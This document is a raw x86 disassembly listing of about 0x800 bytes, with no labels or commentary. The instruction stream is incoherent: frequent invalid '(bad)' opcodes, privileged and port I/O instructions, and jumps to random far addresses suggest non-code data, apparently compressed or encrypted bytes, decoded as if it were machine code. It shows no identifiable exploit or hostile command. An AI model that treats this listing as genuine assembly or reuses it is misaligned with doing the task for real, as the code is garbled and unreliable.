  411d2a:	dec    eax
  411d2b:	outs   dx,BYTE PTR ds:[esi]
  411d2c:	push   esi
  411d2d:	outs   dx,DWORD PTR ds:[esi]
  411d2e:	daa    
  411d2f:	xchg   esp,eax
  411d30:	fisubr DWORD PTR [edx+ebp*2+0x5e]
  411d34:	jne    0x411cbc
  411d36:	mov    ds:0x24c1f3ee,eax
  411d3b:	xor    cl,BYTE PTR [ebx+0x43]
  411d3e:	mov    edi,0xa56cfdb0
  411d43:	ss ret 
  411d45:	lock sbb eax,ebp
  411d48:	pop    esi
  411d49:	icebp  
  411d4a:	ror    DWORD PTR [edi+esi*4+0x54],0x91
  411d4f:	mov    ebp,0x305f7a85
  411d54:	arpl   bp,cx
  411d56:	cmp    BYTE PTR [ebp-0x18],al
  411d59:	xor    BYTE PTR [eax],bl
  411d5b:	or     BYTE PTR [ebx-0x72c8ffcc],bl
  411d61:	hlt    
  411d62:	mov    ebp,DWORD PTR [edx-0x71c3894a]
  411d68:	or     eax,0xcf8fbc42
  411d6d:	pop    ebx
  411d6e:	rol    DWORD PTR [ecx-0x9baee07],0x38
  411d75:	xchg   ecx,eax
  411d76:	ss popa 
  411d78:	inc    eax
  411d79:	mov    ds:0x5bfa4166,eax
  411d7e:	inc    esp
  411d7f:	mov    al,0x6a
  411d81:	imul   edx,ecx,0x7fc07734
  411d87:	mov    bh,0x9e
  411d89:	fs jge 0x411d1d
  411d8c:	pop    es
  411d8d:	dec    ecx
  411d8e:	mov    eax,ds:0x7718a3c0
  411d93:	clc    
  411d94:	jns    0x411d76
  411d96:	and    eax,0xee0d5a67
  411d9b:	test   DWORD PTR [ebp+ecx*8-0x2f],ecx
  411d9f:	fyl2xp1 
  411da1:	ret    0xa481
  411da4:	sbb    BYTE PTR [ebx-0xcbe4000],bh
  411daa:	nop
  411dab:	repnz pusha 
  411dad:	loope  0x411d96
  411daf:	nop
  411db0:	into   
  411db1:	push   ecx
  411db2:	test   BYTE PTR [edi-0x6e873df],bl
  411db8:	dec    eax
  411db9:	aam    0xe
  411dbb:	and    BYTE PTR [ebx],cl
  411dbd:	xor    DWORD PTR [esi],ecx
  411dbf:	adc    al,0xd9
  411dc1:	pop    edx
  411dc2:	push   0x867a1758
  411dc7:	jp     0x411daf
  411dc9:	(bad)  
  411dca:	dec    edi
  411dcb:	push   cs
  411dcc:	inc    ecx
  411dcd:	nop
  411dce:	das    
  411dcf:	push   edx
  411dd0:	rol    BYTE PTR [ebp+0x5dcbf100],0x87
  411dd7:	fsub   QWORD PTR [edi+0x15442111]
  411ddd:	outs   dx,BYTE PTR ds:[esi]
  411dde:	stos   BYTE PTR es:[edi],al
  411ddf:	xchg   edi,eax
  411de0:	jmp    0x3e21cc2d
  411de5:	jle    0x411e65
  411de7:	shr    dh,0x31
  411dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411deb:	or     eax,esp
  411ded:	pop    esp
  411dee:	jecxz  0x411e16
  411df0:	mov    eax,ds:0x63b0106d
  411df5:	dec    ebp
  411df6:	mov    edi,0xde36358a
  411dfb:	xor    BYTE PTR [eax-0x1],al
  411dfe:	scas   eax,DWORD PTR es:[edi]
  411dff:	dec    ebp
  411e00:	(bad)  
  411e01:	mov    ebx,0x1aaaa4fe
  411e06:	xchg   DWORD PTR [edx],ebx
  411e08:	mov    cl,0x84
  411e0a:	xor    eax,0x7f445431
  411e0f:	scas   al,BYTE PTR es:[edi]
  411e10:	inc    esi
  411e11:	loop   0x411e06
  411e13:	push   es
  411e14:	push   es
  411e15:	fsub   DWORD PTR [edx+0x4563cd26]
  411e1b:	inc    ebx
  411e1c:	pop    es
  411e1d:	push   edi
  411e1e:	add    BYTE PTR [esi+0xd],bh
  411e21:	pop    es
  411e22:	jo     0x411db9
  411e24:	sub    BYTE PTR [edx],0xa5
  411e27:	pushf  
  411e28:	xchg   ebx,eax
  411e29:	mov    dh,0xe2
  411e2b:	sbb    esi,DWORD PTR [edx-0x3d]
  411e2e:	fsub   QWORD PTR [edi+0x109f2d6e]
  411e34:	inc    ebp
  411e35:	test   DWORD PTR [esi],ebp
  411e37:	dec    edx
  411e38:	sub    eax,0x806d7983
  411e3d:	inc    esi
  411e3e:	sub    al,0xb7
  411e40:	mov    WORD PTR [edi],fs
  411e42:	repz sub edx,eax
  411e45:	xchg   esp,eax
  411e46:	add    ecx,DWORD PTR [ebx-0x7b]
  411e49:	add    BYTE PTR [edx+0x120b5861],dh
  411e4f:	mov    ecx,0x68c121b7
  411e54:	les    ebp,FWORD PTR [ebx+0x201e2669]
  411e5a:	sub    BYTE PTR [esi],0xb3
  411e5d:	retf   
  411e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e5f:	arpl   WORD PTR [esi],ax
  411e61:	mov    eax,0x897d2abd
  411e66:	arpl   WORD PTR [ebx-0x7f90bd10],sp
  411e6c:	inc    edx
  411e6d:	sub    dl,BYTE PTR [ebx+0x26794f0c]
  411e73:	arpl   di,bx
  411e75:	dec    esp
  411e76:	jns    0x411eba
  411e78:	inc    edi
  411e79:	rcr    BYTE PTR [ecx+eax*2-0x59],cl
  411e7d:	aas    
  411e7e:	jg     0x411e98
  411e80:	jp     0x411ea6
  411e82:	dec    ecx
  411e83:	mov    ebx,0x1f1f9566
  411e88:	push   ebx
  411e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e8a:	iret   
  411e8b:	ins    DWORD PTR es:[edi],dx
  411e8c:	xor    eax,DWORD PTR [edx+0x72]
  411e8f:	dec    DWORD PTR [ebp+0x23]
  411e92:	dec    esp
  411e93:	aad    0x7
  411e95:	loopne 0x411f0e
  411e97:	sub    DWORD PTR [ebx+0x1a],0xdbb3eb1e
  411e9e:	fimul  DWORD PTR [edi]
  411ea0:	mov    bh,0x5c
  411ea2:	add    BYTE PTR [ebp-0x23cda6c6],ch
  411ea8:	imul   ecx,DWORD PTR [ebx-0x61],0xe425e282
  411eaf:	jae    0x411e79
  411eb1:	jge    0x411e34
  411eb3:	rcr    DWORD PTR [edi-0x36],cl
  411eb6:	mov    ah,0x51
  411eb8:	dec    ebx
  411eb9:	push   edx
  411eba:	pop    eax
  411ebb:	rcr    DWORD PTR [ebp-0x30],cl
  411ebe:	cmp    dl,BYTE PTR ds:0x914c36c2
  411ec4:	jnp    0x411ea1
  411ec6:	dec    edi
  411ec7:	mov    ebx,DWORD PTR [esi+0x556dab9c]
  411ecd:	push   edx
  411ece:	xor    DWORD PTR [esp+edx*8+0x72],ebp
  411ed2:	out    0x4e,eax
  411ed4:	xor    eax,0x8c02979
  411ed9:	sbb    ebp,DWORD PTR [edi+edi*1+0x65]
  411edd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ede:	pop    ebx
  411edf:	push   0x6ccf72d
  411ee4:	pop    ecx
  411ee5:	mov    cl,0xc4
  411ee7:	adc    esp,eax
  411ee9:	or     DWORD PTR [ebp-0x25],ebp
  411eec:	test   al,0x47
  411eee:	mov    DWORD PTR [edx-0x193df61e],eax
  411ef4:	lds    edi,FWORD PTR [ecx+0x6]
  411ef7:	add    eax,0x7fa6cb87
  411efc:	inc    ebx
  411efd:	adc    al,BYTE PTR [eax-0x21974f30]
  411f03:	rcl    DWORD PTR [edx+ecx*1+0x2894107a],0xe1
  411f0b:	subps  xmm2,xmm6
  411f0e:	es jp  0x411f50
  411f11:	sti    
  411f12:	adc    ecx,ebx
  411f14:	(bad)  
  411f16:	cmc    
  411f17:	add    al,0x9d
  411f19:	pop    edi
  411f1a:	idiv   DWORD PTR [esi+ecx*4]
  411f1d:	cdq    
  411f1e:	jno    0x411f43
  411f20:	shl    BYTE PTR [edi],cl
  411f22:	jnp    0x411ef8
  411f24:	pop    edx
  411f25:	adc    al,BYTE PTR [eax+0x7cae35ec]
  411f2b:	sbb    al,0x22
  411f2d:	mov    ebx,0xcfa25b68
  411f32:	cdq    
  411f33:	pop    es
  411f34:	sbb    al,0xc9
  411f36:	(bad)  
  411f37:	call   0x2017bff6
  411f3c:	mov    bl,0xd3
  411f3e:	clc    
  411f3f:	daa    
  411f40:	in     eax,0x3f
  411f42:	jg     0x411fa6
  411f44:	fisub  WORD PTR [eax+0x52804161]
  411f4a:	icebp  
  411f4b:	and    al,0x60
  411f4d:	call   0x9ed2:0x3da214dd
  411f54:	(bad)  
  411f55:	mov    bl,0x80
  411f57:	popf   
  411f58:	(bad)  
  411f59:	scas   al,BYTE PTR es:[edi]
  411f5a:	lods   eax,DWORD PTR ds:[esi]
  411f5b:	scas   eax,DWORD PTR es:[edi]
  411f5c:	adc    al,0xd1
  411f5e:	retf   0x59a6
  411f61:	out    dx,eax
  411f62:	mov    ebp,0xf434c473
  411f67:	inc    ecx
  411f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f69:	sbb    al,0x5c
  411f6b:	sub    al,0x35
  411f6d:	jecxz  0x411f1b
  411f6f:	adc    al,0x95
  411f71:	call   0x6a6cbfdf
  411f76:	sahf   
  411f77:	(bad)  
  411f78:	and    edx,DWORD PTR [eax+0x36]
  411f7b:	imul   DWORD PTR [eax]
  411f7d:	or     BYTE PTR [esi-0x3c89579],al
  411f83:	fst    QWORD PTR [ecx-0x6]
  411f86:	or     eax,0x3302032
  411f8b:	nop
  411f8c:	mov    dh,0x82
  411f8e:	cmp    cl,BYTE PTR ds:0xaf500090
  411f94:	mov    dl,0x36
  411f96:	fnstenv [eax-0x5a]
  411f99:	hlt    
  411f9a:	inc    edi
  411f9b:	add    BYTE PTR [ebp+edx*2-0x5545a9ca],0xe5
  411fa3:	fs out 0xb1,eax
  411fa6:	das    
  411fa7:	inc    ebx
  411fa8:	xlat   BYTE PTR ds:[ebx]
  411fa9:	sub    eax,0xa8e4c617
  411fae:	inc    ecx
  411faf:	sub    cl,ah
  411fb1:	push   edx
  411fb2:	aad    0xa4
  411fb4:	xchg   edi,eax
  411fb5:	jnp    0x411f4b
  411fb7:	(bad)  
  411fb8:	jnp    0x411f49
  411fba:	jp     0x411f89
  411fbc:	jo     0x411f42
  411fbe:	outs   dx,DWORD PTR ds:[esi]
  411fbf:	sbb    eax,DWORD PTR [eax-0x36]
  411fc2:	push   ds
  411fc3:	mov    cl,0xb
  411fc5:	inc    esi
  411fc6:	dec    ecx
  411fc7:	(bad)  
  411fc8:	nop
  411fc9:	mov    DWORD PTR [eax],ecx
  411fcb:	pop    eax
  411fcc:	dec    ebp
  411fcd:	jae    0x411fce
  411fcf:	test   DWORD PTR [edi],edi
  411fd1:	fiadd  WORD PTR [ebx+ecx*1]
  411fd4:	popa   
  411fd5:	jl     0x411f9f
  411fd7:	xchg   ebx,eax
  411fd8:	mov    ds:0x858acfea,al
  411fdd:	push   0x17f108bb
  411fe2:	push   eax
  411fe3:	mov    dl,0x18
  411fe5:	out    dx,al
  411fe6:	in     eax,0x51
  411fe8:	cld    
  411fe9:	jl     0x411fbd
  411feb:	cmp    al,0x19
  411fed:	cmp    al,0xea
  411fef:	push   cs
  411ff0:	fwait
  411ff1:	in     eax,0xea
  411ff3:	cmp    eax,0x2394375
  411ff8:	sub    DWORD PTR [esi+0x2591cc24],ebx
  411ffe:	arpl   dx,dx
  412000:	mov    dh,0xec
  412002:	cmp    bl,BYTE PTR [ecx]
  412004:	jnp    0x412046
  412006:	addr16 jge 0x411fdb
  412009:	xor    ch,BYTE PTR [ecx]
  41200b:	mov    ch,0x47
  41200d:	aaa    
  41200e:	push   ds
  41200f:	mov    al,ds:0x2ce1afa1
  412014:	test   BYTE PTR [edi+0x5e],0x9d
  412018:	call   0x2c0e:0x765f7760
  41201f:	idiv   dh
  412021:	outs   dx,DWORD PTR ds:[esi]
  412022:	mov    BYTE PTR [ecx+edi*1-0xd13d67e],dh
  412029:	loop   0x411fb3
  41202b:	sub    eax,0x18bbf108
  412030:	sbb    bl,BYTE PTR [eax]
  412032:	and    bl,ah
  412034:	pop    ds
  412035:	mov    ebp,0x9655a7e9
  41203a:	pop    es
  41203b:	inc    ecx
  41203c:	jmp    0x41200d
  41203e:	fwait
  41203f:	jne    0x411fd5
  412041:	sub    eax,0x271a01c1
  412046:	into   
  412047:	mov    esi,0xd3d7d4b
  41204c:	mov    al,0x95
  41204e:	sbb    eax,0xeb91c811
  412053:	mov    ebx,0x6c9b0d56
  412058:	jg     0x412018
  41205a:	js     0x41202c
  41205c:	mov    dh,0xd7
  41205e:	jp     0x4120ca
  412060:	aas    
  412061:	push   ss
  412062:	mov    esp,DWORD PTR [eax-0x5df3447e]
  412068:	lds    esi,FWORD PTR [ecx]
  41206a:	fstp   QWORD PTR [ebx+0x6596b5f7]
  412070:	sub    al,0xa3
  412072:	std    
  412073:	inc    eax
  412074:	out    0x9a,al
  412076:	out    0xab,eax
  412078:	mov    cl,0x31
  41207a:	sub    ebx,DWORD PTR ds:0xcf7650a1
  412080:	aaa    
  412081:	out    dx,eax
  412082:	jecxz  0x412076
  412084:	push   edx
  412085:	lods   eax,DWORD PTR ds:[esi]
  412086:	sbb    eax,edx
  412088:	inc    ebp
  412089:	mov    al,0x3
  41208b:	(bad)  
  41208c:	cmp    dh,BYTE PTR [edi]
  41208e:	xchg   ebx,eax
  41208f:	mov    ds:0xf59a5081,al
  412094:	fwait
  412095:	ror    BYTE PTR [eax],0x26
  412098:	sub    BYTE PTR [edx+ecx*2+0x1f4bda21],al
  41209f:	aad    0x15
  4120a1:	add    DWORD PTR [ebp+edx*1+0x42],esp
  4120a5:	rcr    DWORD PTR [ebp+0x7b],cl
  4120a8:	popf   
  4120a9:	pusha  
  4120aa:	stos   DWORD PTR es:[edi],eax
  4120ab:	iret   
  4120ac:	sti    
  4120ad:	add    BYTE PTR [edi],0x69
  4120b0:	pop    ebp
  4120b1:	and    DWORD PTR [ecx-0x57817ae9],ecx
  4120b7:	xchg   edx,eax
  4120b8:	xchg   esp,eax
  4120b9:	inc    esp
  4120ba:	shr    BYTE PTR [edi+0x3c9d6539],0x49
  4120c1:	inc    esi
  4120c2:	mov    dl,0x6
  4120c4:	fadd   QWORD PTR [eax+0x730ce942]
  4120ca:	call   FWORD PTR [edi+0x77]
  4120cd:	gs mov eax,0xd61811ee
  4120d3:	jb     0x412118
  4120d5:	mov    es,WORD PTR ds:0x48b78af2
  4120db:	dec    eax
  4120dc:	(bad)
  4120e1:	add    BYTE PTR [ecx],dl
  4120e3:	dec    ecx
  4120e4:	icebp  
  4120e5:	mov    eax,ds:0x8ee27fc0
  4120ea:	ficomp DWORD PTR [edi+0x14]
  4120ed:	jmp    0x84bf37e2
  4120f2:	stos   DWORD PTR es:[edi],eax
  4120f3:	adc    DWORD PTR fs:[eax+eax*1],0xffffffb1
  4120f8:	sbb    BYTE PTR [edi-0x56],0xc9
  4120fc:	and    BYTE PTR [edi+0x6a],al
  4120ff:	pop    esi
  412100:	test   ch,al
  412102:	aam    0xf6
  412104:	pop    es
  412105:	aad    0xb6
  412107:	xor    DWORD PTR [ebp+0x26],edx
  41210a:	(bad)  
  41210b:	data16 jle 0x412090
  41210e:	and    ecx,DWORD PTR ds:0xb1f8ddad
  412114:	int    0x13
  412116:	sbb    al,0x1
  412118:	mov    esp,0x4557e79d
  41211d:	nop
  41211e:	imul   edx,DWORD PTR [ecx-0x3dc4a69e],0x6cb29bc9
  412128:	inc    eax
  412129:	fwait
  41212a:	aas    
  41212b:	fimul  WORD PTR [esi*4-0x772949cf]
  412132:	push   ebp
  412133:	repz iret 
  412135:	mov    eax,0x40f8ddc4
  41213a:	xchg   ebx,eax
  41213b:	xchg   ebx,eax
  41213c:	sahf   
  41213d:	adc    DWORD PTR [edx-0x68],esi
  412140:	push   edi
  412141:	xor    al,0x38
  412143:	mov    al,0xa3
  412145:	lahf   
  412146:	shl    DWORD PTR [eax-0x61],cl
  412149:	xchg   ebx,eax
  41214a:	imul   esp,DWORD PTR [edx],0xcdeaee76
  412150:	fcom   QWORD PTR [ebp-0x33]
  412153:	xor    eax,0x949e74e0
  412158:	fidivr DWORD PTR [ebp+0x54]
  41215b:	es dec eax
  41215d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41215e:	arpl   dx,di
  412160:	rcr    DWORD PTR [edx],1
  412162:	inc    ecx
  412163:	xchg   BYTE PTR [edx+0x45ee04ba],bh
  412169:	lds    edx,FWORD PTR [edx-0x436878aa]
  41216f:	mov    cs,WORD PTR [edi-0x46]
  412172:	outs   dx,DWORD PTR ds:[esi]
  412173:	sub    cl,BYTE PTR [ebx+0x6b949c05]
  412179:	mov    dh,BYTE PTR [edi+ebp*8]
  41217c:	nop
  41217d:	sub    eax,0xe8afe94e
  412182:	repnz (bad) 
  412184:	sbb    dl,dh
  412186:	dec    eax
  412187:	add    dh,BYTE PTR [edi+0x4744900f]
  41218d:	in     al,dx
  41218e:	or     DWORD PTR [ecx+0x2383bcea],ebx
  412194:	popa   
  412195:	mov    ch,0xe7
  412197:	dec    ecx
  412198:	xor    esi,ecx
  41219a:	pop    eax
  41219b:	scas   eax,DWORD PTR es:[edi]
  41219c:	mov    al,BYTE PTR [edi-0x77]
  41219f:	loopne 0x412220
  4121a1:	adc    eax,DWORD PTR [eax+0x4b]
  4121a4:	enter  0x66ac,0xaa
  4121a8:	and    bh,BYTE PTR [ebx]
  4121aa:	mov    DWORD PTR [eax+edx*1],ebp
  4121ad:	lods   al,BYTE PTR ds:[esi]
  4121ae:	dec    ebx
  4121af:	jle    0x412160
  4121b1:	int3   
  4121b2:	pop    ss
  4121b3:	xor    eax,esi
  4121b5:	cmc    
  4121b6:	jo     0x41215c
  4121b8:	xchg   ch,al
  4121ba:	cmp    al,0xa6
  4121bc:	outs   dx,DWORD PTR ds:[esi]
  4121bd:	jecxz  0x41215d
  4121bf:	int    0x36
  4121c1:	imul   edi,edx,0xfffffff6
  4121c4:	iret   
  4121c5:	xchg   ecx,eax
  4121c6:	ficomp WORD PTR [ecx-0x76]
  4121c9:	jne    0x4121b2
  4121cb:	sahf   
  4121cc:	pusha  
  4121cd:	push   ss
  4121ce:	cli    
  4121cf:	mov    cs,WORD PTR [edi+0x52]
  4121d2:	lock push ds
  4121d4:	jnp    0x4121f7
  4121d6:	loopne 0x412190
  4121d8:	inc    ebx
  4121d9:	lahf   
  4121da:	cdq    
  4121db:	mov    ch,BYTE PTR [ecx+0x64d9c02a]
  4121e1:	mov    eax,ds:0x6d0d0039
  4121e6:	rcl    DWORD PTR [ebx+0x2366e36e],0xb5
  4121ed:	lock hlt 
  4121ef:	adc    DWORD PTR [ebx-0x4b],edx
  4121f2:	dec    edi
  4121f3:	pusha  
  4121f4:	lds    ebp,FWORD PTR [edi]
  4121f6:	mov    dl,0x24
  4121f8:	push   0x702cf2
  4121fd:	adc    ah,al
  4121ff:	(bad)  
  412200:	mov    eax,0x6faf9ef2
  412205:	pop    edi
  412206:	push   es
  412207:	iret   
  412208:	mov    cl,0x84
  41220a:	ret    0x8751
  41220d:	int    0xd8
  41220f:	push   0x55
  412211:	in     eax,0x7a
  412213:	add    al,0x63
  412215:	test   al,0xb1
  412217:	test   eax,0x36d4bf14
  41221c:	idiv   BYTE PTR [ebx+0x1de81181]
  412222:	mov    esp,0x4dc3b7ec
  412227:	cwde   
  412228:	sbb    DWORD PTR [eax-0x53c14b9e],ebx
  41222e:	xchg   DWORD PTR [ebx+0x73],ebp
  412231:	std    
  412232:	repnz fdiv DWORD PTR [esi]
  412235:	jmp    0xff456b76
  41223a:	sub    DWORD PTR [esi-0x8],eax
  41223d:	les    edx,FWORD PTR [esi]
  41223f:	icebp  
  412240:	and    edi,DWORD PTR [edi-0x76]
  412243:	mov    BYTE PTR [esi-0xb],bl
  412246:	mov    al,0x5a
  412248:	mov    ds:0x42e3c4cf,al
  41224d:	mov    al,ds:0x34e2fcbf
  412252:	inc    ebp
  412253:	dec    esp
  412254:	push   ds
  412255:	je     0x4122c9
  412257:	xlat   BYTE PTR ds:[ebx]
  412258:	push   ds
  412259:	dec    esp
  41225a:	xor    DWORD PTR [edi+0x529c9011],esp
  412260:	pop    ss
  412261:	mov    ecx,0x77af1ae7
  412266:	or     ecx,ebx
  412268:	jno    0x4122d2
  41226a:	out    dx,eax
  41226b:	pop    ss
  41226c:	fnstenv [ecx]
  41226e:	fdivp  st(7),st
  412270:	out    0xe4,eax
  412272:	out    dx,al
  412273:	adc    ecx,DWORD PTR [ebx+0x610a02ac]
  412279:	jge    0x41227e
  41227b:	jo     0x41220c
  41227d:	fdivr  QWORD PTR [edi+0x4e88167a]
  412283:	pop    esi
  412284:	sub    cl,BYTE PTR [edi+eax*1-0x4b]
  412288:	retf   0xe49f
  41228b:	loop   0x412237
  41228d:	cmp    al,0xb7
  41228f:	mov    ebp,0xf4299322
  412294:	adc    ebp,DWORD PTR [edi]
  412296:	add    ah,BYTE PTR [edi+0x4031dfdf]
  41229c:	rcr    BYTE PTR [edi+0x59],cl
  41229f:	adc    esp,DWORD PTR [edx-0xd83fa52]
  4122a5:	adc    ebx,DWORD PTR [edi]
  4122a7:	frstor [ecx+0x44]
  4122aa:	pop    ecx
  4122ab:	cmc    
  4122ac:	out    dx,al
  4122ad:	loopne 0x4122c7
  4122af:	in     al,dx
  4122b0:	inc    edi
  4122b1:	leave  
  4122b2:	ds dec edi
  4122b4:	bound  edx,QWORD PTR [ebx]
  4122b6:	jl     0x412256
  4122b8:	pop    ss
  4122b9:	hlt    
  4122ba:	sbb    BYTE PTR [ecx-0x526d6f49],bl
  4122c0:	and    BYTE PTR [edi+0x7bfc54e7],bh
  4122c6:	leave  
  4122c7:	or     ah,bh
  4122c9:	pusha  
  4122ca:	adc    DWORD PTR [ecx-0x2abdf372],ebp
  4122d0:	test   BYTE PTR [esi],bh
  4122d2:	hlt    
  4122d3:	adc    eax,0x94532014
  4122d8:	dec    esi
  4122d9:	aam    0x16
  4122db:	mov    ebx,0xcf02b563
  4122e0:	add    eax,0x98ba2ebe
  4122e5:	out    dx,eax
  4122e6:	push   0xa97b245f
  4122eb:	jb     0x41234d
  4122ed:	or     ecx,DWORD PTR [esi-0x4d]
  4122f0:	pusha  
  4122f1:	dec    ebp
  4122f2:	adc    edx,eax
  4122f4:	clc    
  4122f5:	push   ecx
  4122f6:	(bad)  
  4122f7:	(bad)  
  4122f9:	adc    eax,0x29837af7
  4122fe:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412300:	cmp    al,0xf
  412302:	inc    esp
  412303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412304:	inc    ecx
  412305:	push   edi
  412306:	mov    ebx,0x802bd739
  41230b:	xor    BYTE PTR [edi+0x10],ch
  41230e:	add    DWORD PTR [ecx+0x70d45b61],ecx
  412314:	fisubr DWORD PTR [edx+edi*4-0x7c11c75c]
  41231b:	xchg   ebx,eax
  41231c:	mov    al,0x3a
  41231e:	adc    edi,DWORD PTR ds:0x85fb3f32
  412324:	mov    eax,0x186b1877
  412329:	xchg   DWORD PTR [edx-0xa],eax
  41232c:	fcmovb st,st(2)
  41232e:	sub    bh,BYTE PTR [edx+esi*4-0x7f8bca60]
  412335:	add    esi,DWORD PTR [edx+0x18adce12]
  41233b:	and    al,0x88
  41233d:	pop    ds
  41233e:	icebp  
  41233f:	xor    esi,DWORD PTR [esp+ebx*4-0x657f2549]
  412346:	or     DWORD PTR [esi],0xc7f8bc4e
  41234c:	xchg   esp,eax
  41234d:	xlat   BYTE PTR ds:[ebx]
  41234e:	ret    0x4cca
  412351:	jo     0x4122d9
  412353:	jmp    0x412365
  412355:	sbb    DWORD PTR [esi+0x4d49598d],ebx
  41235b:	adc    eax,ecx
  41235d:	int    0xbf
  41235f:	fild   WORD PTR [ecx]
  412361:	mov    ch,0xf9
  412363:	std    
  412364:	xchg   esp,eax
  412365:	pop    ss
  412366:	test   DWORD PTR [esi],edi
  412368:	dec    ebp
  412369:	or     BYTE PTR gs:[ecx+esi*2-0x622d095d],bh
  412371:	call   0x2aff:0x1fedb436
  412378:	ret    0xa1a1
  41237b:	sahf   
  41237c:	or     cl,bh
  41237e:	xchg   esi,eax
  41237f:	jmp    0xddca44e9
  412384:	lds    eax,FWORD PTR [ecx-0x38587168]
  41238a:	mov    dl,bh
  41238c:	xchg   esp,eax
  41238d:	lock push ebp
  41238f:	arpl   WORD PTR [eax],dx
  412391:	jns    0x412314
  412393:	iret   
  412394:	jmp    0x4748:0xd3a7d0b7
  41239b:	sub    BYTE PTR ds:0x1f261642,dl
  4123a1:	jne    0x41236c
  4123a3:	test   DWORD PTR [edi*8+0x412ba362],edi
  4123aa:	sub    ebx,DWORD PTR [ecx]
  4123ac:	jge    0x41237c
  4123ae:	inc    ebx
  4123af:	call   0x7a66:0xc6cf626
  4123b6:	cld    
  4123b7:	stc    
  4123b8:	cmp    eax,0xe92db381
  4123bd:	es jnp 0x4123de
  4123c0:	test   DWORD PTR ds:0x69f3cb0e,esp
  4123c6:	outs   dx,DWORD PTR ds:[esi]
  4123c7:	mov    esp,0xe868ac36
  4123cc:	mov    dl,0x7f
  4123ce:	push   esi
  4123cf:	mov    dh,0xd9
  4123d1:	repnz xchg edx,eax
  4123d3:	out    dx,eax
  4123d4:	retf   0xf00c
  4123d7:	fidivr WORD PTR [ecx+0x69]
  4123da:	in     al,dx
  4123db:	leave  
  4123dc:	sbb    al,bl
  4123de:	inc    esp
  4123df:	retf   0xfe7d
  4123e2:	icebp  
  4123e3:	xchg   edi,eax
  4123e4:	jo     0x41243c
  4123e6:	cmp    ch,0x39
  4123e9:	inc    edi
  4123ea:	(bad)  
  4123eb:	inc    eax
  4123ec:	add    eax,0x7a739b54
  4123f1:	iret   
  4123f2:	ror    edx,cl
  4123f4:	push   ss
  4123f5:	add    bh,BYTE PTR [esi-0x31]
  4123f8:	cwde   
  4123f9:	xchg   esp,eax
  4123fa:	jnp    0x412396
  4123fc:	push   esp
  4123fd:	gs mov ah,0x42
  412400:	hlt    
  412401:	in     al,0x37
  412403:	add    BYTE PTR [edx+eiz*2],bl
  412406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412407:	pop    ecx
  412408:	lods   eax,DWORD PTR ds:[esi]
  412409:	fist   WORD PTR [eax-0x42]
  41240c:	addr16 xchg edi,eax
  41240e:	jp     0x41244a
  412410:	lahf   
  412411:	les    ecx,FWORD PTR [edi+0xf]
  412414:	test   eax,0x40ca145b
  412419:	push   ebp
  41241a:	xchg   ebx,eax
  41241b:	mov    ch,0x42
  41241d:	fwait
  41241e:	rcr    ch,1
  412420:	(bad)  
  412421:	enter  0xcd45,0xe2
  412425:	cwde   
  412426:	mov    ds:0xa9bd05c3,eax
  41242b:	call   0x3709:0x6333999d
  412432:	shl    BYTE PTR [eax+0x75811a1c],1
  412438:	jne    0x4124a3
  41243a:	ss in  al,dx
  41243c:	(bad)  
  41243d:	call   0x9764:0x681054b6
  412444:	ret    0xf992
  412447:	jecxz  0x4123dd
  412449:	xchg   esp,eax
  41244a:	mov    eax,ds:0xbab81083
  41244f:	out    dx,al
  412450:	sub    al,0xe7
  412452:	mov    edx,0x9f2ba98f
  412457:	inc    eax
  412458:	retf   0xcca1
  41245b:	sbb    eax,esp
  41245d:	adc    DWORD PTR [ebp+0x2641939c],edi
  412463:	xchg   edi,eax
  412464:	adc    ch,0x46
  412467:	push   0xffffffab
  412469:	and    eax,0xb2d6ab8e
  41246e:	scas   eax,DWORD PTR es:[edi]
  41246f:	mov    ch,0x6b
  412471:	mov    esi,0x7019cee4
  412476:	stos   BYTE PTR es:[edi],al
  412477:	jmp    ecx
  412479:	mov    bh,0xd9
  41247b:	call   0x8902efd8
  412480:	and    esi,esi
  412482:	mov    ebp,0xdaf2063
  412487:	add    ch,ch
  412489:	and    ebp,esi
  41248b:	sbb    cl,BYTE PTR [ebp-0x409dfdb3]
  412491:	ins    DWORD PTR es:[edi],dx
  412492:	mov    ds,WORD PTR [ebx]
  412494:	imul   esp,eax,0x42
  412497:	daa    
  412498:	dec    BYTE PTR [edi+0x40]
  41249b:	cmp    al,BYTE PTR [eax+0x41]
  41249e:	fcom   DWORD PTR [eax]
  4124a0:	xchg   edx,eax
  4124a1:	call   0xa2c1161e
  4124a6:	fiadd  WORD PTR [esi-0x477f6af]
  4124ac:	imul   ebp,DWORD PTR [edx-0x57],0x5e
  4124b0:	jl     0x41248d
  4124b2:	jmp    0x4124ab
  4124b4:	hlt    
  4124b5:	js     0x41252b
  4124b7:	cmp    BYTE PTR [ebx+0x5e9e25ac],0xd1
  4124be:	out    dx,eax
  4124bf:	scas   eax,DWORD PTR es:[edi]
  4124c0:	push   0xffffffea
  4124c2:	sbb    ebp,DWORD PTR [edi+eiz*4-0x4a661d66]
  4124c9:	das    
  4124ca:	push   es
  4124cb:	or     dl,BYTE PTR [ebx+0x51]
  4124ce:	mov    eax,0x6166106e
  4124d3:	ret    0xa251
  4124d6:	or     eax,0xf3c7ebac
  4124db:	adc    al,0x25
  4124dd:	pushf  
  4124de:	adc    BYTE PTR [edi+0x7445c29c],0x30
  4124e5:	jg     0x412476
  4124e7:	stos   DWORD PTR es:[edi],eax
  4124e8:	enter  0xbb21,0x73
  4124ec:	xchg   ebx,eax
  4124ed:	add    DWORD PTR [edx],eax
  4124ef:	lahf   
  4124f0:	cmp    edx,DWORD PTR [edi+0x44606a2f]
  4124f6:	std    
  4124f7:	mov    edi,0xf1095997
  4124fc:	imul   edi,ebx,0xd7916fee
  412502:	outs   dx,BYTE PTR ds:[esi]
  412503:	or     edx,eax
  412505:	rcr    BYTE PTR [ecx-0x76],cl
  412508:	jmp    0x12f12a91
  41250d:	inc    ebp
  41250e:	push   edi
  41250f:	nop
  412510:	push   esp
  412511:	jnp    0x4124a5
  412513:	std    
  412514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
